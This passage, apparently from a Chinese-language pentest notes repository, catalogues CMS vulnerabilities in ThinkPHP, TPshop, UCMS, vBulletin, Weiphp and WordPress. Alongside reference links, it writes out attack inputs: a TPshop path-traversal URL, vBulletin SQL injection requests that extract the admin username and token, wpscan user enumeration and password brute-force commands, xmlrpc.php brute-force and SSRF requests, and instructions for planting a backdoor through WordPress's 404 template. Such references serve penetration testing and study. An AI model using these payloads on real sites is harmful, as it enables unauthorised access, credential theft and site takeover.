    - [jas502n/ThinkCMF_getshell](https://github.com/jas502n/ThinkCMF_getshell)
---
### ThinkPHP
> 官网: http://www.thinkphp.cn/
#### 5
**thinkphp6 session 任意文件创建漏洞**
- 相关文章
    - [thinkphp6 session 任意文件创建漏洞复现 含POC](https://mp.weixin.qq.com/s/8k96KSpWMk7S4-_TzweXxg)
---
### TPshop
**目录遍历漏洞**
- 相关文章
    - [某shop 前台文件遍历&SSRF组合拳](https://xz.aliyun.com/t/5096)
    - [某软件存在目录遍历漏洞](https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA)
- POC | Payload | exp
    ```
    /index.php/Home/uploadify/fileList?type=.+&path=../../../
    ```
---
### UCMS
**CVE-2020-25483 后台文件上传漏洞**
- 相关文章
    - [UCMS文件上传漏洞(CVE-2020-25483)复现](https://blog.csdn.net/xuandao_ahfengren/article/details/110233085)
### vBulletin
**vBulletin 5.6.1 SQL 注入**
```
http://localhost/vb5/ajax/api/content_attach/getIndexableContent"  -H 'X-Requested-With: XMLHttpRequest' -d "nodeId[nodeid]=SQLi
```
获取管理员用户：
```
http://SITE/vb5/ajax/api/content_infraction/getIndexableContent"  -H 'X-Requested-With: XMLHttpRequest' -d "nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,username,8,7,6,5,4,3,2,1+from+user+where+userid=1--
```
获取admin token：
```
http://SITE/vb5/ajax/api/content_infraction/getIndexableContent"  -H 'X-Requested-With: XMLHttpRequest' -d "nodeId[nodeid]=1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,token,8,7,6,5,4,3,2,1+from+user+where+userid=1--
```
---
### Weiphp
**CNVD-2020-68596 前台文件任意读取**
- POC | Payload | exp
    - [Weiphp5.0 前台文件任意读取 CNVD-2020-68596](https://mp.weixin.qq.com/s/XoXrKBUBlQ_yjwCJSdpUzg)
**CNVD-2021-09693 Weiphp5.0 任意用户Cookie伪造**
- 相关文章
    - [Weiphp5.0 任意用户Cookie伪造 CNVD-2021-09693](https://mp.weixin.qq.com/s/aklOSIWUJ2Bzmqwjj845TA)
---
### WordPress
> 官网 : https://wordpress.org/
WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网站和博客.
**搭建教程**
- [WordPress 搭建](../../../Integrated/Linux/Power-Linux.md#WordPress)
**Tips**
- 默认的登录地址一般是 `/wp-admin` 或 `/wp-login.php`
**相关工具**
- [wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) - kali 自带,漏洞扫描需要 API Token,可扫用户、漏洞、目录,挺好用的
    ```bash
    wpscan --url https://www.xxxxx.com/     # 直接扫描
    wpscan --url https://www.xxxxx.com/ --enumerate u    # 枚举用户
    wpscan --url https://www.xxxxx.com/ --passwords /tmp/password.txt   # 密码爆破
    wpscan --url https://www.xxxxx.com/ --usernames admin --passwords out.txt  # 指定用户爆破
    wpscan --url https://www.xxxxx.com/ --api-token xxxxxxxxCX8TTkkgt2oIY   # 使用 API Token,扫描漏洞
    wpscan --url https://www.xxxxx.com/ -e vp --api-token xxxxxxx    # 扫描插件漏洞
    wpscan --url https://www.xxxxx.com/ -e vt --api-token xxxxxxx    # 扫描主题漏洞
    ```
    - [WPScan使用完整教程之记一次对WordPress的渗透过程](https://xz.aliyun.com/t/2794)
**xmlrpc.php**
- [xmlrpc.php 漏洞利用](https://blog.csdn.net/u012206617/article/details/109002948)
- 查看系统允许的方法
    ```
    POST /wordpress/xmlrpc.php HTTP/1.1
    Host: www.example.com
    Content-Length: 99
    system.listMethods
    ```
- 账号爆破
    一般情况下，wordpress 的管理后台都会设置账号登录失败次数限制，因此，可以通过 xmlprc.php 接口来进行爆破。通常会使用 wp.getUserBlogs、wp.getCategories 和 metaWeblog.getUsersBlogs 这个方法来进行爆破，也可以使用其他的方法。
    ```
    POST /wordpress/xmlrpc.php HTTP/1.1
    Host: www.example.com
    Content-Length: 99
    wp.getUsersBlogs
    admin
    password
    ```
- SSRF
    WordPress 版本 
    pingback.ping
    要探测的ip和端口：http://127.0.0.1:80
    网站上一篇博客的URL：http://localhost/wordpress/?p=1)
    ```
**WordPress 后台拿 SHELL**
- 后台编辑404页面Getshell
    "主题"-“编辑”-“404.php”
    ```
    ```
    插到文件头,404默认模板路径是：wp-content/themes/twentyten/404.php,其中"twentyten"目录是默认模板目录。更新完直接访问 localhost/wp-content/themes/twentyten/404.php 就会在twentyten目录生成一句话后门文件cong.php 密码pass，插入的代码是Chr加密，可自行编辑。（仔细看代码，文件名与一句话代码用" ,w "隔开了）
- 上传本地主题Getshell